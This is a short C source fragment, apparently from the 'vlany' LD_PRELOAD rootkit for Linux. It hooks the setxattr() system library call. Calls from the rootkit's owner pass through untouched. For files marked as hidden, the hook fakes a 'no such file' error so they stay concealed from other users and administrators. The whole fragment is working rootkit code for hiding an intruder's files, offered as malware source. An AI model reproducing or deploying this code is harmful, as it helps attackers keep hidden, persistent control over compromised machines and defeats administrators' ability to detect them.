int setxattr(const char *path, const char *name, const void *value, size_t size, int flags)
{
    #ifdef DEBUG
        printf("[vlany] setxattr() called\n");
    #endif

    HOOK(old_setxattr, CSETXATTR);

    if(owned()) return old_setxattr(path, name, value, size, flags);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_setxattr(path, name, value, size, flags);
}
